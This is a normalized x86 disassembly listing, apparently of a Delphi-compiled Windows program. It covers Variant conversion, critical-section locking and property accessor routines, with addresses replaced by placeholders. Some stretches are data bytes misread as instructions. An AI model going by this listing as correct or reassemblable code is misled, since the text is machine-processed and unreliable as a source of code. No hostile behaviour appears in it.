push ebx
lea eax [ ebp - 0x10 ]
push eax
mov eax [ rw-data ]
mov eax [ eax ]
call eax
mov dx [ ebx ]
mov cx 0x8
call sub_40ec34
push esi
lea eax [ ebp - 0x14 ]
mov edx [ ebp - 0x8 ]
call sub_4046d8
mov eax [ ebp - 0x14 ]
mov ecx 0x7fffffff
mov edx 0x1
call sub_4047c4
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_40fb80
lea eax [ ebp - 0x10 ]
call sub_40ef54
retn
sub_40fba4
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
push esi
mov esi edx
mov ebx eax
lea eax [ ebp - 0x10 ]
push eax
call VariantInit
xor eax eax
push ebp
push sub_40fbfa
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx ebx
lea eax [ ebp - 0x10 ]
call sub_40f27c
lea eax [ ebp - 0x10 ]
call [ rw-data ]
lea edx [ ebp - 0x10 ]
mov eax esi
call sub_40fcd0
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_40fc01
lea eax [ ebp - 0x10 ]
call sub_40ef54
retn
sub_40fc08
push ebp
mov ebp esp
add esp 0xffffffe0
push ebx
xor ecx ecx
mov [ ebp - 0x20 ] ecx
mov [ ebp - 0x4 ] edx
mov ebx eax
mov eax [ ebp - 0x4 ]
test eax eax
je r-xdata
xor eax eax
push ebp
push sub_40fcc0
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0xc ]
mov ax [ ebx ]
call sub_410940
mov [ ebp - 0x5 ] al
cmp [ ebp - 0x5 ] 0x0
je r-xdata
xor edx edx
mov [ eax ] edx
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_40fcc7
lea eax [ ebp - 0x20 ]
call sub_4045c8
retn
lea eax [ ebp - 0x1c ]
push eax
call VariantInit
xor eax eax
push ebp
push sub_40fca3
push [ fs : eax ]
mov [ fs : eax ] esp
push 0x8
mov ecx ebx
lea edx [ ebp - 0x1c ]
mov eax [ ebp - 0xc ]
mov ebx [ eax ]
call [ ebx + 0x1c ]
mov eax [ ebp - 0x4 ]
push eax
lea eax [ ebp - 0x20 ]
mov edx [ ebp - 0x14 ]
call sub_4046d8
mov eax [ ebp - 0x20 ]
mov ecx 0x7fffffff
mov edx 0x1
call sub_4047c4
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
lea eax [ ebp - 0x1c ]
call sub_40ef54
retn
sub_40fcd0
push ebp
mov ebp esp
mov ecx 0xe
push 0x0
push 0x0
dec ecx
jne r-xdata
push ecx
push ebx
push esi
mov ebx edx
mov esi eax
xor eax eax
push ebp
push sub_410222
push [ fs : eax ]
mov [ fs : eax ] esp
mov ax [ ebx ]
movzx edx ax
cmp edx 0x14
ja r-xdata
mov edx eax
sub dx 0x100
je r-xdata
jmp [ edx * 4 + jump_table_40fd0a ]
mov eax esi
mov edx [ ebx + 0x8 ]
call sub_404714
jmp r-xdata
dec dx
je r-xdata
mov eax esi
call sub_4045c8
jmp r-xdata
cmp [ rw-data ] 0x0
je r-xdata
lea edx [ ebp - 0x4 ]
movsx eax [ ebx + 0x8 ]
call sub_407f38
mov edx [ ebp - 0x4 ]
mov eax esi
call sub_404714
jmp r-xdata
lea edx [ ebp - 0x8 ]
mov eax [ ebx + 0x8 ]
call sub_407f38
mov edx [ ebp - 0x8 ]
mov eax esi
call sub_404714
jmp r-xdata
fld [ ebx + 0x8 ]
add esp 0xfffffff4
fstp [ esp ]
fwait
lea eax [ ebp - 0xc ]
call sub_4097c0
mov edx [ ebp - 0xc ]
mov eax esi
call sub_404714
jmp r-xdata
fld [ ebx + 0x8 ]
add esp 0xfffffff4
fstp [ esp ]
fwait
lea eax [ ebp - 0x10 ]
call sub_4097c0
mov edx [ ebp - 0x10 ]
mov eax esi
call sub_404714
jmp r-xdata
push [ ebx + 0xc ]
push [ ebx + 0x8 ]
lea eax [ ebp - 0x14 ]
call sub_40f2c0
mov edx [ ebp - 0x14 ]
mov eax esi
call sub_404604
jmp r-xdata
push [ ebx + 0xc ]
push [ ebx + 0x8 ]
lea eax [ ebp - 0x18 ]
call sub_40f2f8
mov edx [ ebp - 0x18 ]
mov eax esi
call sub_404604
jmp r-xdata
push esi
lea eax [ ebp - 0x1c ]
mov edx [ ebx + 0x8 ]
call sub_4046d8
mov eax [ ebp - 0x1c ]
mov ecx 0x7fffffff
mov edx 0x1
call sub_4047c4
jmp r-xdata
lea edx [ ebp - 0x20 ]
mov ax [ ebx + 0x8 ]
call sub_40f330
mov edx [ ebp - 0x20 ]
mov eax esi
call sub_404604
jmp r-xdata
lea edx [ ebp - 0x24 ]
movsx eax [ ebx + 0x8 ]
call sub_407f38
mov edx [ ebp - 0x24 ]
mov eax esi
call sub_404714
jmp r-xdata
lea edx [ ebp - 0x28 ]
xor eax eax
mov al [ ebx + 0x8 ]
call sub_407f38
mov edx [ ebp - 0x28 ]
mov eax esi
call sub_404714
jmp r-xdata
lea edx [ ebp - 0x2c ]
movzx eax [ ebx + 0x8 ]
call sub_407f38
mov edx [ ebp - 0x2c ]
mov eax esi
call sub_404714
jmp r-xdata
mov eax [ ebx + 0x8 ]
xor edx edx
push edx
push eax
lea eax [ ebp - 0x30 ]
call sub_408024
mov edx [ ebp - 0x30 ]
mov eax esi
call sub_404714
jmp r-xdata
push [ ebx + 0xc ]
push [ ebx + 0x8 ]
lea eax [ ebp - 0x34 ]
call sub_408024
mov edx [ ebp - 0x34 ]
mov eax esi
call sub_404714
jmp r-xdata
mov eax [ ebx + 0x8 ]
mov edx eax
mov eax esi
call sub_40fcd0
jmp r-xdata
lea edx [ ebp - 0x38 ]
mov eax ebx
call sub_40faec
mov edx [ ebp - 0x38 ]
mov eax esi
call sub_404604
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_410229
lea eax [ ebp - 0x74 ]
mov edx 0x2
call sub_4045e0
lea eax [ ebp - 0x6c ]
mov edx 0x5
call sub_403f0c
lea eax [ ebp - 0x58 ]
mov edx 0x3
call sub_4045e0
lea eax [ ebp - 0x4c ]
mov edx 0x4
call sub_403f0c
lea eax [ ebp - 0x3c ]
mov edx 0x2
call sub_4045e0
lea eax [ ebp - 0x34 ]
mov edx 0x5
call sub_403f0c
lea eax [ ebp - 0x20 ]
mov edx 0x4
call sub_4045e0
lea eax [ ebp - 0x10 ]
mov edx 0x4
call sub_403f0c
retn
lea edx [ ebp - 0x3c ]
mov eax ebx
call sub_40fba4
mov edx [ ebp - 0x3c ]
mov eax esi
call sub_404604
jmp r-xdata
jmp r-xdata
mov eax esi
mov edx [ rw-data ]
call sub_404714
jmp r-xdata
mov dx 0x8
mov ax 0x1
call sub_40e7f4
test ah 0x40
je r-xdata
mov eax esi
call sub_4045c8
mov edx eax
mov eax ebx
call sub_40fc08
test al al
jne r-xdata
movzx eax ax
and eax 0xffffbfff
cmp eax 0x14
ja r-xdata
lea edx [ ebp - 0x74 ]
mov eax ebx
call sub_40faec
mov edx [ ebp - 0x74 ]
mov eax esi
call sub_404604
lea edx [ ebp - 0x70 ]
mov eax ebx
call sub_40faec
mov edx [ ebp - 0x70 ]
mov eax esi
call sub_404604
jmp r-xdata
jmp [ eax * 4 + jump_table_40ff91 ]
lea edx [ ebp - 0x40 ]
mov eax [ ebx + 0x8 ]
movsx eax [ eax ]
call sub_407f38
mov edx [ ebp - 0x40 ]
mov eax esi
call sub_404714
jmp r-xdata
lea edx [ ebp - 0x44 ]
mov eax [ ebx + 0x8 ]
mov eax [ eax ]
call sub_407f38
mov edx [ ebp - 0x44 ]
mov eax esi
call sub_404714
jmp r-xdata
mov eax [ ebx + 0x8 ]
fld [ eax ]
add esp 0xfffffff4
fstp [ esp ]
fwait
lea eax [ ebp - 0x48 ]
call sub_4097c0
mov edx [ ebp - 0x48 ]
mov eax esi
call sub_404714
jmp r-xdata
mov eax [ ebx + 0x8 ]
fld [ eax ]
add esp 0xfffffff4
fstp [ esp ]
fwait
lea eax [ ebp - 0x4c ]
call sub_4097c0
mov edx [ ebp - 0x4c ]
mov eax esi
call sub_404714
jmp r-xdata
mov eax [ ebx + 0x8 ]
push [ eax + 0x4 ]
push [ eax ]
lea eax [ ebp - 0x50 ]
call sub_40f2c0
mov edx [ ebp - 0x50 ]
mov eax esi
call sub_404604
jmp r-xdata
mov eax [ ebx + 0x8 ]
push [ eax + 0x4 ]
push [ eax ]
lea eax [ ebp - 0x54 ]
call sub_40f2f8
mov edx [ ebp - 0x54 ]
mov eax esi
call sub_404604
jmp r-xdata
mov eax esi
mov edx [ ebx + 0x8 ]
mov edx [ edx ]
call sub_4046d8
jmp r-xdata
lea edx [ ebp - 0x58 ]
mov eax [ ebx + 0x8 ]
mov ax [ eax ]
call sub_40f330
mov edx [ ebp - 0x58 ]
mov eax esi
call sub_404604
jmp r-xdata
lea edx [ ebp - 0x5c ]
mov eax [ ebx + 0x8 ]
movsx eax [ eax ]
call sub_407f38
mov edx [ ebp - 0x5c ]
mov eax esi
call sub_404714
jmp r-xdata
lea edx [ ebp - 0x60 ]
mov eax [ ebx + 0x8 ]
movzx eax [ eax ]
call sub_407f38
mov edx [ ebp - 0x60 ]
mov eax esi
call sub_404714
jmp r-xdata
lea edx [ ebp - 0x64 ]
mov eax [ ebx + 0x8 ]
movzx eax [ eax ]
call sub_407f38
mov edx [ ebp - 0x64 ]
mov eax esi
call sub_404714
jmp r-xdata
mov eax [ ebx + 0x8 ]
mov eax [ eax ]
xor edx edx
push edx
push eax
lea eax [ ebp - 0x68 ]
call sub_408024
mov edx [ ebp - 0x68 ]
mov eax esi
call sub_404714
jmp r-xdata
mov eax [ ebx + 0x8 ]
push [ eax + 0x4 ]
push [ eax ]
lea eax [ ebp - 0x6c ]
call sub_408024
mov edx [ ebp - 0x6c ]
mov eax esi
call sub_404714
jmp r-xdata
mov eax [ ebx + 0x8 ]
mov edx eax
mov eax esi
call sub_40fcd0
jmp r-xdata
sub_410230
push ebx
push esi
push edi
mov ebx ecx
mov esi edx
mov edi eax
test [ edi ] 0xbfe8
je r-xdata
cmp [ rw-data ] 0x0
je r-xdata
mov eax edi
call sub_40eed8
mov [ edi ] 0x3
movsx eax bl
mov ax [ eax * 2 + rw-data ]
mov [ edi ] ax
jmp r-xdata
mov [ edi + 0x8 ] esi
pop edi
pop esi
pop ebx
retn
sub_41026c
push ebp
mov ebp esp
push ebx
mov ebx eax
test [ ebx ] 0xbfe8
je r-xdata
mov [ ebx ] 0x14
mov eax [ ebp + 0x8 ]
mov [ ebx + 0x8 ] eax
mov eax [ ebp + 0xc ]
mov [ ebx + 0xc ] eax
pop ebx
pop ebp
retn 0x8
mov eax ebx
call sub_40eed8
sub_410298
push ebx
push esi
mov ebx edx
mov esi eax
test [ esi ] 0xbfe8
je r-xdata
mov [ esi ] 0xb
cmp bl 0x1
cmc
sbb eax eax
mov [ esi + 0x8 ] ax
pop esi
pop ebx
retn
mov eax esi
call sub_40eed8
sub_4102fc
push ebx
push esi
mov esi edx
mov ebx eax
test [ ebx ] 0xbfe8
je r-xdata
xor eax eax
mov [ ebx + 0x8 ] eax
mov [ ebx ] 0x100
lea eax [ ebx + 0x8 ]
mov edx esi
call sub_403f3c
pop esi
pop ebx
retn
mov eax ebx
call sub_40eed8
sub_410328
push ebx
push esi
mov esi edx
mov ebx eax
test [ ebx ] 0xbfe8
je r-xdata
xor eax eax
mov [ ebx + 0x8 ] eax
mov [ ebx ] 0x8
lea eax [ ebx + 0x8 ]
push eax
mov ecx 0x7fffffff
mov edx 0x1
mov eax esi
call sub_4047c4
pop esi
pop ebx
retn
mov eax ebx
call sub_40eed8
sub_4104e4
push ebp
mov ebp esp
add esp 0xfffffdf8
push ebx
push esi
push edi
xor ecx ecx
mov [ ebp - 0x208 ] ecx
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_41060a
push [ fs : eax ]
mov [ fs : eax ] esp
mov edi ebx
and di 0xfff
cmp di 0x14
ja r-xdata
cmp bx 0x100
jne r-xdata
mov eax esi
movzx edx di
mov edx [ edx * 4 + rw-data ]
call sub_403f3c
jmp r-xdata
cmp bx 0x101
jne r-xdata
mov eax esi
mov edx r-xdata
call sub_403f3c
jmp r-xdata
test bh 0x20
je r-xdata
lea edx [ ebp - 0x4 ]
mov eax ebx
call sub_410940
test al al
je r-xdata
mov eax esi
mov edx r-xdata
call sub_403f3c
jmp r-xdata
test bh 0x40
je r-xdata
mov ecx [ esi ]
mov eax esi
mov edx r-xdata
call sub_4041f4
lea ecx [ ebp - 0x208 ]
movzx eax di
mov edx 0x4
call sub_40804c
mov ecx [ ebp - 0x208 ]
mov edx [ rw-data ]
mov edx [ edx ]
mov eax esi
call sub_4041f4
lea eax [ ebp - 0x104 ]
push eax
lea edx [ ebp - 0x204 ]
mov eax [ ebp - 0x4 ]
mov eax [ eax ]
call sub_4030e8
lea eax [ ebp - 0x204 ]
mov ecx 0x7fffffff
mov edx 0x2
call sub_402874
lea edx [ ebp - 0x104 ]
mov eax esi
call sub_40414c
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_410611
lea eax [ ebp - 0x208 ]
call sub_403ee8
retn
mov ecx [ esi ]
mov eax esi
mov edx r-xdata
call sub_4041f4
sub_41068c
push [ edx + 0x56080040 ]
popad
jb r-xdata
xor edi edi
popad
outsb
je r-xdata
add [ eax ] eax
add [ ebp - 0x3e ] bl
add al 0x0
push ebx
push esi
push edi
push ecx
mov esi ecx
mov edi edx
mov ebx eax
mov edx esp
mov ax [ esi ]
call sub_410940
test al al
je r-xdata
mov eax eax
mov eax ebx
call sub_4108c0
mov ax [ ebx + 0x4 ]
push eax
mov ecx esi
mov edx edi
mov eax [ esp + 0x4 ]
mov ebx [ eax ]
call [ ebx + 0x1c ]
jmp r-xdata
pop edx
pop edi
pop esi
pop ebx
retn
sub_41069c
push ebp
mov ebp esp
push ebx
push esi
mov esi rw-data
push rw-data
call EnterCriticalSection
xor edx edx
push ebp
push sub_4106fd
push [ fs : edx ]
mov [ fs : edx ] esp
mov eax [ esi ]
call sub_404d5c
mov ebx eax
dec ebx
cmp ebx 0x0
jl r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_410704
push rw-data
call LeaveCriticalSection
retn
mov eax [ esi ]
mov eax [ eax + ebx * 4 ]
cmp eax [ rw-data ]
je r-xdata
dec ebx
cmp ebx 0xffffffff
jne r-xdata
call sub_403198
sub_41074c
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
mov esi ecx
mov [ ebp - 0x4 ] edx
mov ebx eax
mov edi [ ebp + 0x8 ]
cmp di [ ebx + 0x4 ]
je r-xdata
mov eax ebx
call sub_4108c0
lea edx [ ebp - 0x8 ]
mov ax [ esi ]
call sub_410940
test al al
je r-xdata
push edi
mov ecx esi
mov edx [ ebp - 0x4 ]
mov eax [ ebp - 0x8 ]
mov ebx [ eax ]
call [ ebx + 0x1c ]
jmp r-xdata
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn 0x4
sub_4107a0
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov edi edx
mov esi eax
lea eax [ ebp - 0x1 ]
push eax
mov edx edi
mov eax esi
mov ebx [ eax ]
call [ ebx + 0x38 ]
xor eax eax
mov al [ ebp - 0x1 ]
mov edx [ ebp + 0x8 ]
lea edx [ edx + edx * 2 ]
add edx rw-data
mov al [ edx + eax - 0x2a ]
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn 0x4
sub_4107d8
push ebx
push esi
push edi
push ebp
push ecx
mov esi ecx
mov edi edx
mov ebx eax
mov ecx esp
mov edx esi
mov eax ebx
mov ebp [ eax ]
call [ ebp + 0xc ]
test al al
je r-xdata
mov eax ebx
call sub_4108c0
mov ax [ esp ]
push eax
mov ecx esi
mov edx edi
mov eax ebx
mov ebx [ eax ]
call [ ebx + 0x1c ]
jmp r-xdata
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
sub_410814
push ebp
mov ebp esp
add esp 0xfffffff8
call sub_403524
mov [ ebp - 0x5 ] dl
mov [ ebp - 0x4 ] eax
push rw-data
call EnterCriticalSection
xor edx edx
push ebp
push sub_410877
push [ fs : edx ]
mov [ fs : edx ] esp
mov eax [ ebp - 0x4 ]
mov ax [ eax + 0x4 ]
test ax ax
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41087e
push rw-data
call LeaveCriticalSection
retn
movzx eax ax
mov edx [ rw-data ]
mov ecx [ rw-data ]
mov [ edx + eax * 4 - 0x400 ] ecx
sub_410918
push ebp
mov ebp esp
push ebx
mov ebx [ ebp + 0x8 ]
mov ecx [ ebp + 0x10 ]
mov edx [ ebp + 0xc ]
mov eax ebx
call sub_40324c
test al al
je r-xdata
mov eax 0x80004002
xor eax eax
jmp r-xdata
pop ebx
pop ebp
retn 0xc
sub_410940
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov esi edx
mov ebx eax
cmp [ rw-data ] 0x0
je r-xdata
xor eax eax
jmp r-xdata
cmp bx 0x100
jb r-xdata
mov [ ebp - 0x1 ] al
cmp [ ebp - 0x1 ] 0x0
je r-xdata
cmp bx 0x7ff
jbe r-xdata
mov al [ ebp - 0x1 ]
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
push rw-data
call EnterCriticalSection
xor eax eax
push ebp
push sub_4109e8
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ rw-data ]
call sub_404d5c
movzx edi bx
mov edx edi
sub edx 0x100
cmp eax edx
setg [ ebp - 0x1 ]
cmp [ ebp - 0x1 ] 0x0
je r-xdata
mov al 0x1
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
push rw-data
call LeaveCriticalSection
retn
mov eax [ rw-data ]
mov eax [ eax + edi * 4 - 0x400 ]
mov [ esi ] eax
cmp [ esi ] 0x0
je r-xdata
xor eax eax
jmp r-xdata
mov eax [ esi ]
cmp eax [ rw-data ]
jne r-xdata
mov [ ebp - 0x1 ] al
mov al 0x1
sub_4109f8
push ebp
mov ebp esp
add esp 0xfffffef0
push ebx
push esi
push edi
xor ecx ecx
mov [ ebp - 0x10 ] ecx
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_410ace
push [ fs : eax ]
mov [ fs : eax ] esp
mov [ ebp - 0x9 ] 0x0
push rw-data
call EnterCriticalSection
xor eax eax
push ebp
push sub_410ab1
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ rw-data ]
call sub_404d64
mov esi eax
test esi esi
jl r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_410ab8
push rw-data
call LeaveCriticalSection
retn
inc esi
xor edi edi
inc edi
dec esi
jne r-xdata
cmp ebx [ rw-data ]
je r-xdata
mov eax [ rw-data ]
mov ebx [ eax + edi * 4 ]
test ebx ebx
je r-xdata
lea edx [ ebp - 0x110 ]
mov eax [ ebx ]
call sub_4030e8
lea edx [ ebp - 0x110 ]
lea eax [ ebp - 0x10 ]
call sub_40414c
mov eax [ ebp - 0x10 ]
mov edx [ ebp - 0x4 ]
call sub_407d04
test al al
je r-xdata
mov eax [ ebp - 0x8 ]
mov [ eax ] ebx
mov [ ebp - 0x9 ] 0x1
jmp r-xdata
sub_410ae8
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_410b57
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_410b5e
retn
call sub_41069c
push rw-data
call DeleteCriticalSection
mov eax rw-data
mov edx [ r-xdata ]
call sub_404f24
mov eax rw-data
mov ecx 0x15
mov edx [ r-xdata ]
call sub_404970
mov eax rw-data
call sub_403ee8
mov eax rw-data
call sub_40ef68
sub_410b60
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_410c01
push [ fs : eax ]
mov [ fs : eax ] esp
sub [ rw-data ] 0x1
jae r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_410c08
retn
mov eax rw-data
call sub_41066c
mov eax sub_40ec68
mov [ rw-data ] eax
mov eax sub_40e890
mov [ rw-data ] eax
mov edx sub_40e7a0
mov [ rw-data ] edx
mov [ rw-data ] eax
mov eax sub_40ef68
mov edx [ rw-data ]
mov [ edx ] eax
mov eax sub_410360
mov edx [ rw-data ]
mov [ edx ] eax
mov eax sub_40f27c
mov edx [ rw-data ]
mov [ edx ] eax
mov eax sub_40f5a8
mov edx [ rw-data ]
mov [ edx ] eax
mov eax sub_40fcd0
mov edx [ rw-data ]
mov [ edx ] eax
push rw-data
call InitializeCriticalSection
sub_410c0c
salc
inc edi
add [ ebp + 0x640000ff ] ch
salc
inc edi
add [ esi + 0x640000ff ] ch
salc
inc edi
add [ edi + 0x640000ff ] ch
salc
inc edi
add [ eax + 0x640000ff ] dl
salc
inc edi
add [ ecx + 0x640000ff ] dl
salc
inc edi
add [ edx + 0x640000ff ] dl
salc
inc edi
add [ ebx + 0x640000ff ] dl
salc
inc edi
add [ edi + edi * 8 - 0x299c0000 ] dl
inc edi
add [ ebp + 0x640000ff ] dl
salc
inc edi
add [ esi + 0x640000ff ] dl
salc
inc edi
add [ edi + 0x640000ff ] dl
salc
inc edi
add [ eax + 0x640000ff ] bl
salc
inc edi
add [ ecx + 0x640000ff ] bl
salc
inc edi
add [ edx + 0x640000ff ] bl
salc
inc edi
add [ ebx + 0x640000ff ] bl
salc
inc edi
add [ edi + edi * 8 - 0x299c0000 ] bl
inc edi
add [ ebp + 0x640000ff ] bl
salc
inc edi
add [ esi + 0x640000ff ] bl
salc
inc edi
add [ edi + 0x640000ff ] bl
salc
inc edi
add [ eax + 0x640000ff ] al
salc
inc edi
add [ ecx + 0x640000ff ] al
salc
inc edi
add [ edx + 0x640000ff ] al
salc
inc edi
add [ ebx + 0x640000ff ] al
salc
inc edi
add [ edi + edi * 8 - 0x299c0000 ] al
inc edi
add [ ebp + 0x640000ff ] al
salc
inc edi
add [ esi + 0x640000ff ] al
salc
inc edi
add [ edi + 0x640000ff ] al
salc
inc edi
add [ eax + 0x640000ff ] cl
salc
inc edi
add [ ecx + 0x550000ff ] cl
mov ebp esp
xor eax eax
push ebp
push sub_410d19
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_410d20
retn
sub_410d64
push ebx
push esi
push edi
test edx edx
je r-xdata
or eax 0xffffffff
xor ecx ecx
mov cl [ eax + 0x1 ]
mov eax [ eax + ecx + 0xb ]
mov eax [ eax ]
mov cl [ eax + 0x1 ]
lea esi [ eax + ecx + 0xf ]
mov edi [ eax + ecx + 0x7 ]
xor eax eax
inc eax
lea esi [ ecx + esi + 0x1 ]
cmp eax edi
jle r-xdata
mov bl [ ecx + edx - 0x1 ]
xor bl [ ecx + esi ]
test bl 0xdf
jne r-xdata
mov cl [ esi ]
cmp ecx [ edx - 0x4 ]
jne r-xdata
mov cl [ esi ]
dec ecx
jne r-xdata
jmp r-xdata
pop edi
pop esi
pop ebx
retn
sub_410db0
push ebx
push esi
mov esi edx
mov ebx eax
cmp [ ebx ] 0x1
jne r-xdata
mov eax ebx
call sub_410d58
cmp [ eax + 0x1 ] 0x0
jge r-xdata
mov eax esi
call sub_408074
pop esi
pop ebx
retn
mov edx esi
mov eax ebx
call sub_410d64
mov edx [ rw-data ]
mov eax esi
call sub_407d04
test al al
je r-xdata
mov edx [ rw-data ]
mov eax esi
call sub_407d04
test al al
je r-xdata
xor eax eax
jmp r-xdata
mov eax esi
call sub_408074
jmp r-xdata
or eax 0xffffffff
jmp r-xdata
pop esi
pop ebx
retn
sub_410e14
push ebx
push esi
push edi
test eax eax
je r-xdata
pop edi
pop esi
pop ebx
retn
mov ecx edx
or edx edx
je r-xdata
xor ebx ebx
mov bl [ eax + 0x1 ]
lea esi [ eax + ebx + 0x2 ]
mov bl [ esi + 0xa ]
movzx edi [ esi + ebx + 0xb ]
test edi edi
je r-xdata
mov cl [ edx - 0x4 ]
mov ch [ edx ]
and ecx 0xdfff
mov eax [ esi + 0x4 ]
test eax eax
je r-xdata
lea eax [ esi + ebx + 0xd ]
mov eax [ eax ]
jmp r-xdata
mov bh 0x0
mov bh 0x0
dec edi
lea eax [ eax + ebx + 0x1b ]
jne r-xdata
mov ch [ edx ]
and ch 0xdf
mov bl [ eax + 0x1a ]
jmp r-xdata
dec ebx
jne r-xdata
mov bx [ eax + 0x1a ]
and bh 0xdf
cmp ebx ecx
je r-xdata
mov ch [ ebx + edx - 0x1 ]
xor ch [ eax + ebx + 0x1a ]
test ch 0xdf
jne r-xdata
sub_410e84
push ebx
push edi
mov edi [ edx ]
mov edi [ edi ]
mov bl 0x4
cmp [ edi ] 0x7
je r-xdata
mov ecx [ edx + 0x4 ]
cmp [ edx + 0x7 ] 0xfe
mov edx [ edx + 0x10 ]
jb r-xdata
xor ecx ecx
mov cl [ edi + 0x1 ]
mov bl [ edi + ecx + 0x2 ]
call ecx
jmp r-xdata
ja r-xdata
cmp bl 0x4
jae r-xdata
and ecx 0xffffff
add ecx eax
mov al [ ecx ]
cmp bl 0x2
jb r-xdata
movsx ecx cx
add ecx [ eax ]
call [ ecx ]
jmp r-xdata
pop edi
pop ebx
retn
cmp bl 0x2
jae r-xdata
mov ax [ ecx ]
cmp bl 0x4
jb r-xdata
movsx eax ax
je r-xdata
cmp bl 0x0
movsx eax al
je r-xdata
mov eax [ ecx ]
and eax 0xffff
and eax 0xff
pop edi
pop ebx
retn
sub_410ef8
push ebx
push esi
push edi
mov edi edx
mov esi [ edi ]
mov esi [ esi ]
mov bl 0x4
cmp [ esi ] 0x7
je r-xdata
mov edx [ edi + 0x10 ]
cmp edx 0x80000000
jne r-xdata
xor ebx ebx
mov bl [ esi + 0x1 ]
mov bl [ esi + ebx + 0x2 ]
mov esi [ edi + 0x8 ]
cmp [ edi + 0xb ] 0xfe
ja r-xdata
mov edx ecx
and esi 0xffffff
add eax esi
mov [ eax ] cl
cmp bl 0x2
jb r-xdata
jb r-xdata
pop edi
pop esi
pop ebx
retn
mov [ eax ] cx
cmp bl 0x4
jb r-xdata
call esi
jmp r-xdata
movsx esi si
add esi [ eax ]
call [ esi ]
jmp r-xdata
mov [ eax ] ecx
sub_410f54
push esi
push edi
mov esi edx
mov edx [ esi + 0x10 ]
cmp edx 0x80000000
jne r-xdata
mov edi [ esi + 0x8 ]
cmp [ esi + 0xb ] 0xfe
ja r-xdata
mov edx ecx
and edi 0xffffff
add edi eax
mov eax [ esi ]
mov eax [ eax ]
mov esi ecx
xor ecx ecx
mov cl [ eax + 0x1 ]
mov cl [ eax + ecx + 0x2 ]
lodsb [ esi ]
cmp al cl
jb r-xdata
jb r-xdata
stosb [ edi ]
mov cl al
[ edi ] [ esi ]
pop edi
pop esi
retn
mov al cl
call edi
pop edi
pop esi
retn
movsx edi di
add edi [ eax ]
call [ edi ]
pop edi
pop esi
retn
sub_410fa8
push ebx
push esi
push edi
add esp 0xffffff00
mov edi ecx
mov esi edx
mov ebx eax
mov eax esp
mov edx edi
mov ecx 0xff
call sub_404184
mov ecx esp
mov edx esi
mov eax ebx
call sub_410f54
add esp 0x100
pop edi
pop esi
pop ebx
retn
sub_410ff0
push esi
push edi
mov esi edx
mov edx [ esi + 0x10 ]
cmp edx 0x80000000
jne r-xdata
mov edi [ esi + 0x8 ]
cmp [ esi + 0xb ] 0xfe
ja r-xdata
mov edx ecx
and edi 0xffffff
add eax edi
mov edx ecx
call sub_410fdc
pop edi
pop esi
retn
jb r-xdata
call edi
pop edi
pop esi
retn
movsx edi di
add edi [ eax ]
call [ edi ]
pop edi
pop esi
retn
sub_411030
push ebp
mov ebp esp
push 0x0
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_411078
push [ fs : eax ]
mov [ fs : eax ] esp
lea eax [ ebp - 0x4 ]
mov edx edi
call sub_404714
mov ecx [ ebp - 0x4 ]
mov edx esi
mov eax ebx
call sub_4110b4
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41107f
lea eax [ ebp - 0x4 ]
call sub_4045c8
retn
sub_411088
push ebx
mov ebx [ edx ]
mov ebx [ ebx ]
mov bl [ ebx ]
sub bl 0x5
je r-xdata
call sub_410fa8
pop ebx
retn
sub bl 0x5
je r-xdata
call sub_410ff0
pop ebx
retn
dec bl
je r-xdata
call sub_411030
jmp r-xdata
pop ebx
retn
sub_4110b4
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
push esi
push edi
xor ebx ebx
mov [ ebp - 0xc ] ebx
mov edi ecx
mov ebx edx
mov esi eax
xor eax eax
push ebp
push sub_41117a
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebx ]
mov eax [ eax ]
mov al [ eax ]
sub al 0x5
je r-xdata
lea eax [ ebp - 0xc ]
mov edx edi
call sub_404170
mov ecx [ ebp - 0xc ]
mov edx ebx
mov eax esi
call sub_411088
jmp r-xdata
sub al 0x5
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_411181
lea eax [ ebp - 0xc ]
call sub_403ee8
retn
dec al
je r-xdata
mov eax [ ebx + 0x8 ]
mov edx eax
and edx 0xff000000
cmp edx 0xff000000
jne r-xdata
jmp r-xdata
cmp edx 0xfe000000
jne r-xdata
mov ebx eax
and ebx 0xffffff
add ebx esi
